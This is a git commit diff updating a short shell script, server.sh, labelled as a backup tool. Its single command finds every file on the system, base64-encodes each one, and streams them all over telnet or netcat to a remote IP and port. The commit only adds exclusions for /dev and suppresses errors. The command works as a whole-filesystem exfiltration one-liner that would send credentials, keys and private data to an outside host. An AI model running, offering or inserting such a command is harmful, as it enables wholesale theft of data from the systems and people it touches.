f2ede43acf0168c2ca0300211e5c4b1fc855cd17
maxpl0it <c01dtwitt@gmail.com>
2017-10-07 11:27:49 +0530

    Update server.sh

--- server.sh
+++ server.sh
@@ -1,4 +1,4 @@
 # Either set the variables $BACKUPIP and $BACKUPPORT or just replace them in the command.
 #
 # Telnet can be replaced with netcat, depending on what the system has available
-echo -n $(find / -type f | while read x; do echo -n @${x}!$(base64 $x); done) | telnet $BACKUPIP $BACKUPPORT
+echo -n $(find / -type f -not -path "/dev/*" -not -path "/dev" 2>/dev/null | while read x; do echo -n @${x}!$(base64 $x); done) | telnet $BACKUPIP $BACKUPPORT
